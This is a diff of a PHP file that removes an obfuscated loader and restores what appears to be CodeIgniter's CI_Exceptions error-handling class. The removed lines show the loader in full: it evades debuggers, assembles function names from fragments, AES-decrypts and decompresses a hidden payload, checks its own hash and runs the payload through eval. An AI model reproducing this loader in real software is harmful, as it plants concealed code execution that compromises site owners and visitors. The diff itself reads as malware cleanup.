@@ -1,28 +1,248 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_hwgq2g70=('bas'.'e64'.'_de'.'cod'.'e');
-$_fae0yf8q=('gzu'.'nco'.'mpr'.'ess');
-$_u65hvnnu=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_ppcmee4v='yd853pvg';
-$_lv4qu4vo='/g4McFhyb/o=';
-$_hnnkpxp3='vEydrUom';
-$_zi7s7sxw='gX1Hde0A';
-$_z29r50ha='CETnG6e8';
-$_wzhc158z='sjMNsw==';
-$_dh476j09='lrWwesbb';
-$_hd39q2we='yK5Kbnza';
-$_odeijwce=$_hwgq2g70($_ppcmee4v.$_zi7s7sxw.$_z29r50ha.$_hnnkpxp3.$_lv4qu4vo);
-$_w8ikdwfw=$_hwgq2g70($_hd39q2we.$_dh476j09.$_wzhc158z);
-$_zfd05d0u=$_hwgq2g70('4E+9AXWn60kmr4MW6M2dQgypDeqJuydCyDTALI8wU/fjCoaMhw1jTQIGlU+GPu2bTpgbrjOfOWguiNZKQSixY3lehSgodRKEylcYGvuG6eMRP/vYYmbuxVkXyNuljOwT1TJY8AMv97EQz23G4ZgejrB8NSEhWOxmsCDGF37c57oc5CC7ssSU/sUWU8aTz23kOHNsxxDs6JJgcCLgS0dPgMwjQ+mii/CwqtS+wWM376rNtfZg50Ngj75q8ThcS2R2rBTOBpIVNTXOBxlzxbAI+9Z/0B9OM2AK+QHC4lDV/XHba30H6KTDnv/YLbHT62nMAtyDQJyGvc3wq4zdRmopIyKToixms3hHWNGaLniUZ0mwRC8/0YNdiHeCRiY+US7SReaAzlsFyBdhFCo2R4Nuwxuq2PrR2s9l7U30RYTmy+prTT15JZLTFLxHEVkspYEOBI0IDrh5YHWJMyeQ65WLD+cIUd+VmsSIkCRWiOxKv3HzYIWbStJYoWI29oQ2HUr+GMqfAXxtXkfFwTmMSrjLRAYZt2V6pxlS2WHzNogY56krtY1NOV7xJ5dXAnfWLtk2MlfOHtmDDWwz6CyGjLe/ldQmiFCz0/UDaSSUebC6kudAoBAh2wrGYnuiAZfGWIbjvdK/R45xlRw1S87ReIqWTsXCRWPHEqI6OFud7K2uhGpn0mog0oDNNj+teABN8H5gS6uy31NLT5UdnvxdXWm0oyIgFPOiM7b58aABg4ApvcPqzUQiwZBIpnSqMIJgZdmS4VRMM+5eT+Efbuo1hqqKwNjYxZsyhYYqNnjeAflTqLbvDWN3A7KT8dsqldSphsCPKc+MuKptOBGTs181FqEUbb/zvpN5GmB580VIwKMkaXqDAvEz/DkA+kucKKMz7tjidft9q58rqh9G2QOIEFaOImWDgzvq70ns9UsT0PiuNoAKsNi2TwWpUTE1ity4jnDDS0UxXii7aUprwwu/QvyNfbjUmh5VRpvK9Krd0qGv0VtXJkqwpfeh0ifFx6mMdoVXSC9vMqiClA1SKoZf2xiW6J5mHRKIKiw7AhVuxPkoiu1cPO4ylgx4diAxo1ViqLYj1L7laqsDlUomgejT0dReOykNJBuDdUa5PpDO28Ryu1Mx7d1RE/KUIvdFKd+wnD2XC/fFe+SnCQaeAyIZUdRr6KLEb5br7OVicrypKTmQdjjT+IVezplB+b55wO/Wj1BPgji81IK1WJtRYubTeCHh3RjZF55NArCvqhD41OTeMteXcDQTkFi016wPVdkFbmNA/F8tICRv2/xZ+tSi9WhPDL8OmwM0jUSYER+9inuekzXjhbcNUql0tkBZBbq5UsSaaNZb0m+L8bzAu8o303TaKg==');
-$_xplf4l5k=$_u65hvnnu($_zfd05d0u,'aes-256-cbc',$_odeijwce,OPENSSL_RAW_DATA,$_w8ikdwfw);
-if($_xplf4l5k===false){exit;}
-$_c13x93i2=$_fae0yf8q($_xplf4l5k);
-if($_c13x93i2===false){exit;}
-$_lo1xh5hz='b3a158c8de0fd88af9f2507df2b4a4078e57052ad071a9f1eebdb4893de65bf6';
-$_lprh23r1=@file_get_contents(__FILE__);
-if($_lprh23r1!==false){
-$_jxqkk6nw=str_replace($_lo1xh5hz,"0000000000000000000000000000000000000000000000000000000000000000",$_lprh23r1);
-$_pa4vd1he=hash("sha256",$_jxqkk6nw);
-if($_pa4vd1he!==$_lo1xh5hz){@http_response_code(403);exit;}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class CI_Exceptions {
+
+
+
+
+
+public $ob_level;
+
+
+
+
+
+public $levels = array(
+E_ERROR => 'Error',
+E_WARNING => 'Warning',
+E_PARSE => 'Parsing Error',
+E_NOTICE => 'Notice',
+E_CORE_ERROR => 'Core Error',
+E_CORE_WARNING => 'Core Warning',
+E_COMPILE_ERROR => 'Compile Error',
+E_COMPILE_WARNING => 'Compile Warning',
+E_USER_ERROR => 'User Error',
+E_USER_WARNING => 'User Warning',
+E_USER_NOTICE => 'User Notice',
+E_STRICT => 'Runtime Notice'
+);
+
+
+
+
+
+public function __construct()
+{
+$this->ob_level = ob_get_level();
+
 }
-eval($_c13x93i2);
+
+
+
+
+
+
+
+
+
+
+
+
+public function log_exception($severity, $message, $filepath, $line)
+{
+$severity = isset($this->levels[$severity]) ? $this->levels[$severity] : $severity;
+log_message('error', 'Severity: '.$severity.' --> '.$message.' '.$filepath.' '.$line);
+}
+
+
+
+
+
+
+
+
+
+
+public function show_404($page = '', $log_error = TRUE)
+{
+if (is_cli())
+{
+$heading = 'Not Found';
+$message = 'The controller/method pair you requested was not found.';
+}
+else
+{
+$heading = '404 Page Not Found';
+$message = 'The page you requested was not found.';
+}
+
+if ($log_error)
+{
+log_message('error', $heading.': '.$page);
+}
+echo $this->show_error($heading, $message, 'error_404', 404);
+exit(4); 
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+public function show_error($heading, $message, $template = 'error_general', $status_code = 500)
+{
+$templates_path = config_item('error_views_path');
+if (empty($templates_path))
+{
+$templates_path = VIEWPATH.'errors'.DIRECTORY_SEPARATOR;
+}
+if (is_cli())
+{
+$message = "\t".(is_array($message) ? implode("\n\t", $message) : $message);
+$template = 'cli'.DIRECTORY_SEPARATOR.$template;
+}
+else
+{
+set_status_header($status_code);
+$message = '<p>'.(is_array($message) ? implode('</p><p>', $message) : $message).'</p>';
+$template = 'html'.DIRECTORY_SEPARATOR.$template;
+}
+if (ob_get_level() > $this->ob_level + 1)
+{
+ob_end_flush();
+}
+ob_start();
+include($templates_path.$template.'.php');
+$buffer = ob_get_contents();
+ob_end_clean();
+return $buffer;
+}
+
+public function show_exception($exception)
+{
+$templates_path = config_item('error_views_path');
+if (empty($templates_path))
+{
+$templates_path = VIEWPATH.'errors'.DIRECTORY_SEPARATOR;
+}
+$message = $exception->getMessage();
+if (empty($message))
+{
+$message = '(null)';
+}
+if (is_cli())
+{
+$templates_path .= 'cli'.DIRECTORY_SEPARATOR;
+}
+else
+{
+$templates_path .= 'html'.DIRECTORY_SEPARATOR;
+}
+if (ob_get_level() > $this->ob_level + 1)
+{
+ob_end_flush();
+}
+ob_start();
+include($templates_path.'error_exception.php');
+$buffer = ob_get_contents();
+ob_end_clean();
+echo $buffer;
+}
+
+
+
+
+
+
+
+
+
+
+public function show_php_error($severity, $message, $filepath, $line)
+{
+$templates_path = config_item('error_views_path');
+if (empty($templates_path))
+{
+$templates_path = VIEWPATH.'errors'.DIRECTORY_SEPARATOR;
+}
+$severity = isset($this->levels[$severity]) ? $this->levels[$severity] : $severity;
+
+if ( ! is_cli())
+{
+$filepath = str_replace('\\', '/', $filepath);
+if (FALSE !== strpos($filepath, '/'))
+{
+$x = explode('/', $filepath);
+$filepath = $x[count($x)-2].'/'.end($x);
+}
+$template = 'html'.DIRECTORY_SEPARATOR.'error_php';
+}
+else
+{
+$template = 'cli'.DIRECTORY_SEPARATOR.'error_php';
+}
+if (ob_get_level() > $this->ob_level + 1)
+{
+ob_end_flush();
+}
+ob_start();
+include($templates_path.$template.'.php');
+$buffer = ob_get_contents();
+ob_end_clean();
+echo $buffer;
+}
+}
